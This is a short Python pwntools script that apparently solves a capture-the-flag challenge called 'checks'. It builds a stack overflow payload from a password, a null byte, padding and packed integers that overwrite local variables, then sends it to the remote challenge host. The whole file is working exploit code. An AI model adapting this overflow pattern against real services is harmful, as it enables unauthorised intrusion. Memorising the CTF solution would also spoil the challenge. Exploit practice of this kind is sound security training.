import struct
from pwn import *

### Variables  ###############################
password = "password123"
ways_to_leave_your_lover = 50;
what_i_cant_drive = 55;
when_im_walking_out_on_center_circle = 245;
which_highway_to_take_my_telephones_to = 61;
when_i_learned_the_truth = 17;

### Packing into Payload #####################
NULL_BYTE = struct.pack('B', 0) # To show end of string
payload = password.encode() + NULL_BYTE + (b"A" * (64-len(password)-1 + 0x60-0x14-64))
# THe A characters is additional padding to reach the desired memory location
# The bottom variables are in reverse order, just like in the bianry
payload += p32(when_i_learned_the_truth)
payload += p32(which_highway_to_take_my_telephones_to)
payload += p32(when_im_walking_out_on_center_circle)
payload += p32(what_i_cant_drive)
payload += p32(ways_to_leave_your_lover)
payload += b"\n"
print(payload)

### Execution ##################################
#r = process("./checks")
r = remote("shell.actf.co", 21303)
r.send(payload)
r.interactive()
